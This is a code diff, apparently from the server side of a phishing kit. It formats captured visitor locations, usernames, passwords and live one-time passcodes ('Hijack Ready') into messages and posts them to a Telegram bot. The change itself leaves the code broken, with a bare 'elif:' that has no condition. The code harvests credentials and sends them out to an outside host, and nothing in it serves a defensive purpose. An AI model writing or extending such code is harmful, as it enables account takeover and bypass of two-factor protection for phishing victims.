@@ -24,7 +24,7 @@ def handle_requests():
         if dtype == 'VISIT':
             msg = f"👀 **TARGET DETECTED**\n📍 City: `{city}`\n🌐 Network: `{isp}`\n📱 Device: `{data.get('d')[:50]}...`"
 
-          else:
+          elif:
             # Login and Passwords
             password = data.get('p')
             msg = f"🚀 **NEW HIT DETECTED**\n👤 User: `{user}`\n🔑 Pass: `{password}`\n📊 Status: {dtype}"
@@ -34,11 +34,7 @@ def handle_requests():
             otp_code = data.get('o')
             msg = f"🔥 **Z-PROXY HIT (OTP)**\n👤 User: `{user}`\n🔢 **LIVE OTP: {otp_code}**\n🔥 Status: Hijack Ready"
         
-        else:
-            # Login and Passwords
-            password = data.get('p')
-            msg = f"🚀 **NEW HIT DETECTED**\n👤 User: `{user}`\n🔑 Pass: `{password}`\n📊 Status: {dtype}"
-
+        
         # Send to Telegram
         url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
         requests.post(url, json={"chat_id": CID, "text": msg, "parse_mode": "Markdown"})
